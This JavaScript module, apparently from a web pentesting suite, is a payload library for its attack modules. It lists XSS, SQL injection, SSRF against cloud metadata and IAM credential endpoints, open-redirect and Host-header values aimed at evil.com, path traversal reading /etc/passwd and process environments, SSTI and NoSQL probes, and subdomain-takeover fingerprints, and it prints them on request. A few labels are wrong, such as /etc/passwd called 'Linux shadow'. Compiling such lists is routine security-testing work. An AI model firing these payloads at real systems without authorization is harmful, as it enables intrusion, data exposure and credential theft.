'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: payload-library.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: payload-library.js                                 ║
 * ║  Purpose: Centralized security payloads for attack modules      ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

const payloads = {
  xss: [
    { payload: '<script>alert(1)</script>', context: 'html', description: 'Basic script alert' },
    { payload: '"><script>alert(1)</script>', context: 'attribute', description: 'Attribute breakout' },
    { payload: "'-alert(1)-'", context: 'javascript', description: 'JS string breakout' },
    { payload: '<img src=x onerror=alert(1)>', context: 'html', description: 'Event handler' },
    { payload: 'javascript:alert(1)', context: 'url', description: 'Protocol handler' },
    { payload: '<svg onload=alert(1)>', context: 'html', description: 'SVG onload' },
    { payload: '"><svg/onload=alert(1)>', context: 'attribute', description: 'SVG breakout' },
    { payload: '<details open ontoggle=alert(1)>', context: 'html', description: 'Details tag' },
    { payload: '<iframe src="javascript:alert(1)">', context: 'html', description: 'Iframe JS' },
    { payload: '<video><source onerror="alert(1)">', context: 'html', description: 'Video source error' },
    { payload: '"><a href="javascript:alert(1)">Click</a>', context: 'attribute', description: 'Link injection' },
    { payload: "`'><script>alert(1)</script>", context: 'mixed', description: 'Polyglot' },
    { payload: '/*-alert(1)-*/', context: 'javascript', description: 'Comment breakout' },
    { payload: '<style>@import "javascript:alert(1)";</style>', context: 'html', description: 'CSS import' },
    { payload: '<object data="javascript:alert(1)">', context: 'html', description: 'Object data' },
    { payload: '<embed src="javascript:alert(1)">', context: 'html', description: 'Embed src' },
    { payload: '<math><mtext><option><annotation encoding="SVG"><script>alert(1)</script>', context: 'html', description: 'MathML polyglot' },
    { payload: '"><img src=x onerror=alert(1)>', context: 'attribute', description: 'Attribute image error' },
    { payload: '<isindex action=javascript:alert(1) type=image>', context: 'html', description: 'Isindex' },
    { payload: '<form><button formaction=javascript:alert(1)>Click', context: 'html', description: 'Formaction' }
  ],
  sqli: [
    { payload: "' OR '1'='1", context: 'auth', description: 'Authentication bypass' },
    { payload: "') OR ('1'='1", context: 'auth', description: 'Bracketed bypass' },
    { payload: "' UNION SELECT 1,2,3,4,5,6--", context: 'union', description: 'Basic Union' },
    { payload: "' UNION SELECT NULL,NULL,NULL,@@version--", context: 'version', description: 'Version fingerprinting' },
    { payload: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", context: 'blind', description: 'Time-based blind (MySQL)' },
    { payload: "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--", context: 'error', description: 'Error-based information schema' },
    { payload: "'; WAITFOR DELAY '0:0:5'--", context: 'blind', description: 'Time-based blind (MSSQL)' },
    { payload: "' AND pg_sleep(5)--", context: 'blind', description: 'Time-based blind (PostgreSQL)' },
    { payload: "' OR 1=1 LIMIT 1--", context: 'auth', description: 'Limit-based bypass' },
    { payload: "' AND 1=0 UNION ALL SELECT table_name,NULL FROM information_schema.tables--", context: 'union', description: 'Table enumeration' }
  ],
  ssrf: [
    { payload: 'http://169.254.169.254/latest/meta-data/', context: 'aws', description: 'AWS Metadata' },
    { payload: 'http://metadata.google.internal/computeMetadata/v1/', context: 'gcp', description: 'GCP Metadata' },
    { payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', context: 'azure', description: 'Azure Metadata' },
    { payload: 'http://localhost:80', context: 'internal', description: 'Localhost scan' },
    { payload: 'http://127.0.0.1:22', context: 'internal', description: 'SSH probe' },
    { payload: 'http://192.168.1.1', context: 'internal', description: 'Private network' },
    { payload: 'http://0.0.0.0', context: 'internal', description: 'Local network bypass' },
    { payload: 'http://[::1]:80', context: 'ipv6', description: 'IPv6 localhost' },
    { payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', context: 'aws', description: 'AWS IAM Credentials' }
  ],
  openRedirect: [
    { payload: '//evil.com', context: 'shorthand', description: 'Protocol-relative' },
    { payload: 'https://evil.com', context: 'full', description: 'Full URL' },
    { payload: '/\\evil.com', context: 'bypass', description: 'Backslash bypass' },
    { payload: 'https:evil.com', context: 'bypass', description: 'Colon bypass' },
    { payload: '@evil.com', context: 'bypass', description: 'At-sign bypass' },
    { payload: '〱evil.com', context: 'unicode', description: 'Unicode bypass' },
    { payload: 'https://example.com@evil.com', context: 'authority', description: 'Authority override' }
  ],
  pathTraversal: [
    { payload: '../../../../etc/passwd', context: 'linux', description: 'Linux shadow' },
    { payload: '..\\..\\..\\..\\windows\\win.ini', context: 'windows', description: 'Windows ini' },
    { payload: '/etc/passwd\0', context: 'bypass', description: 'Null-byte bypass' },
    { payload: '....//....//....//etc/passwd', context: 'bypass', description: 'Double dots bypass' },
    { payload: '%2e%2e%2f%2e%2e%2fetc%2fpasswd', context: 'encoding', description: 'URL encoded' },
    { payload: '/proc/self/environ', context: 'linux', description: 'Environment variables' }
  ],
  ssti: [
    { payload: '{{7*7}}', context: 'jinja2', description: 'Twice/Jinja2 test' },
    { payload: '${7*7}', context: 'freemarker', description: 'FreeMarker/Velocity test' },
    { payload: '<%= 7*7 %>', context: 'erb', description: 'ERB test' },
    { payload: '#{7*7}', context: 'mvel', description: 'MVEL test' },
    { payload: '*{7*7}', context: 'thymeleaf', description: 'Thymeleaf test' }
  ],
  nosql: [
    { payload: '{"$gt":""}', context: 'query', description: 'Greater than bypass' },
    { payload: '{"$ne":null}', context: 'query', description: 'Not equal bypass' },
    { payload: '{"$where":"sleep(5000)"}', context: 'js', description: 'JavaScript sleep' }
  ],
  subdomainTakeover: [
    { service: 'GitHub Pages', fingerprint: 'There isn\'t a GitHub Pages site here.', cname: 'github.io' },
    { service: 'Heroku', fingerprint: 'no such app', cname: 'herokudns.com' },
    { service: 'Netlify', fingerprint: 'Not Found', cname: 'netlify.com' },
    { service: 'AWS S3', fingerprint: 'NoSuchBucket', cname: 's3.amazonaws.com' },
    { service: 'Azure', fingerprint: 'The specified resource does not exist.', cname: 'azurewebsites.net' },
    { service: 'Tilda', fingerprint: 'Domain has been assigned', cname: 'tilda.ws' },
    { service: 'Zeit/Vercel', fingerprint: 'The deployment could not be found.', cname: 'vercel.app' },
    { service: 'Tumblr', fingerprint: 'Whatever you were looking for is not here', cname: 'tumblr.com' },
    { service: 'Wordpress', fingerprint: 'Do you want to register', cname: 'wordpress.com' },
    { service: 'Shopify', fingerprint: 'Sorry, this shop is currently unavailable', cname: 'myshopify.com' }
  ],
  hostHeader: [
    { payload: 'evil.com', description: 'Direct replacement' },
    { payload: 'localhost', description: 'Localhost override' },
    { payload: '127.0.0.1', description: 'IP override' },
    { payload: 'example.com@evil.com', description: 'At-sign override' },
    { payload: '[::1]', description: 'IPv6 override' }
  ]
};

function run(argv = process.argv) {
  const categoryArg = argv.find(a => a.startsWith('--category='));
  const category = categoryArg ? categoryArg.split('=')[1] : null;

  if (category && payloads[category]) {
    console.log(JSON.stringify(payloads[category], null, 2));
  } else {
    console.log(JSON.stringify(payloads, null, 2));
  }
}

if (require.main === module) {
  run();
}

module.exports = { payloads, run };
